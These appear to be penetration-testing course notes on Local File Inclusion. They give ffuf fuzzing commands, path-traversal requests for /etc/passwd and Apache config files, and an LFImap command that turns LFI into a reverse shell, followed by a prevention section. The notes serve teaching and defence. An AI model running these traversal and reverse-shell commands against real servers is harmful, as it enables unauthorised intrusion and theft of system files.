
##  1- Automated Scanning
Automated scanning helps us quickly identify and exploit **Local File Inclusion (LFI)** vulnerabilities without manually crafting each payload.  
While manual testing is more reliable and flexible against **WAFs/firewalls**, automated tools are useful for **trivial or large-scale testing**.  
We can use **fuzzing** to discover hidden parameters or **LFI wordlists** and **specialized tools** to detect and confirm vulnerable endpoints.
####  Fuzzing Parameters
Web applications often contain **hidden or unused parameters** not visible in forms.  
These parameters can be vulnerable since they are less tested.  
We can fuzz parameters to discover such inputs using tools like **ffuf**.
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```
Once a hidden parameter is found (e.g., `language`), test it for LFI manually.  
For higher accuracy, limit fuzzing to **common LFI parameters** found on this [link](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters).

####  LFI Wordlists
Manual testing is best, but we can use **LFI wordlists**  ` /usr/share/wordlists/seclists/Fuzzing/LFI`to automate quick checks.  
A popular one is `LFI-Jhaddix.txt`, which includes various payloads and bypasses.
```bash
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

This identifies working LFI payloads (e.g., `../../../../etc/passwd`).  
After finding them, **verify manually** that the payloads return valid file contents.
#### Fuzzing Server Files
LFI isn’t limited to `/etc/passwd`.  
We can also fuzz for **important server files** that help with further exploitation, like webroots, configuration files, and logs.
##### Webroot Fuzzing
To locate the actual webroot path:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```
Once the webroot is known, use absolute paths to find uploaded or sensitive files.
##### Server Logs & Configurations
Reading configuration files helps locate **webroot**, **log directories**, and **Apache variables** (useful for log poisoning).

To do so, we may also use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, as it contains many of the server logs and configuration paths we may be interested in. If we wanted a more precise scan, we can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows),
```bash
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```
Example discoveries:
```bash
# /etc/apache2/apache2.conf
# /etc/apache2/envvars
```
Read them:
```bash
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
```

```bash

# DocumentRoot /var/www/html   ==> the web root path here 

#     ErrorLog ${APACHE_LOG_DIR}/error.log
#     CustomLog ${APACHE_LOG_DIR}/access.log combined
```
we find the web root path ` /var/www/html`
 the log path is using a global apache variable (APACHE_LOG_DIR), which are found in another file  we saw above, which is (`/etc/apache2/envvars`), and we can read it to find the variable values:
 
From `/etc/apache2/envvars`, we can extract:
```
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
```

As we can see, the (`APACHE_LOG_DIR`) variable is set to (`/var/log/apache2`), and the previous configuration told us that the log files are `/access.log` and `/error.log`, 

so the  the log file paths:
```
/var/log/apache2/access.log
/var/log/apache2/error.log
```
#### 6- LFI Tools
Automated LFI exploitation tools can save time but may miss deeper issues.  
Common tools include:  [LFISuite](https://github.com/D35m0nd142/LFISuite) , [LFiFreak](https://github.com/OsandaMalith/LFiFreak) , [liffy](https://github.com/mzfr/liffy)



##### LFImap
A powerful LFI discovery and exploitation tool supporting various PHP wrappers and path traversal attacks.  
It allows full control of HTTP requests and can even exploit RCE automatically with a reverse shell.
```bash
# Scan a single target using all attack modules
python3 lfimap.py -U "http://target.com/vuln.php?file=test" -a

# Test POST parameters
python3 lfimap.py -U "http://target.com/index.php" -D "page=test" -a

# Exploit LFI to get reverse shell
python3 lfimap.py -U "http://target.com/vuln.php?file=test" -a -x --lhost <IP> --lport <PORT>

```

##### best wordlist
```bash
/usr/share/wordlist/Auto_Wordlists/wordlists/file_inclusion_linux.txt
```


---
## 2- File Inclusion Prevention

Avoid passing user-controlled input directly into file-inclusion functions. When impossible to remove user input, map/validate inputs against a safe whitelist and always provide a sane default.

###  File Inclusion Prevention

- Do not send raw user input into file-read/include APIs.
- If architecture can't be changed, implement a whitelist (DB table, case-match, static JSON map) that maps allowed inputs to files; use the matched file name in the include call instead of the raw input.
### Preventing Directory Traversal
- Prefer built-in framework functions that extract only filenames (e.g., PHP `basename()`), but be aware that these can break cases where entering directories is required.
- Sanitize input to remove traversal patterns recursively to avoid bypasses.
- Example defensive sanitization (concept): repeatedly strip `../` from the input before using it
### Web server  configuration

- Globally disable remote file inclusion where possible (e.g., in PHP set `allow_url_fopen` and `allow_url_include` to `Off`).
- Lock the app to its web root (use `open_basedir = /var/www` in PHP or run inside containers like Docker).
- Disable dangerous modules (examples: PHP Expect, Apache `mod_userdir`) to reduce attack surface.
### Web Application Firewall (WAF)
- Use a WAF (e.g., ModSecurity) primarily to detect and slow attacks — start in permissive/reporting mode to tune rules and avoid false positives.
- Even permissive mode provides early warning signals and helps tune defenses
### Hardening philosophy & monitoring
- Hardening reduces impact and buys time for detection — it’s not a guarantee of invulnerability.
- Continue active monitoring and regular testing (including after zero-days/patches) because hardening should make attacks noisier and easier to detect.
- Example risks from successful traversal: reading `/etc/passwd`, stealing keys, discovering Tomcat config, session hijacking, or viewing source/config files.


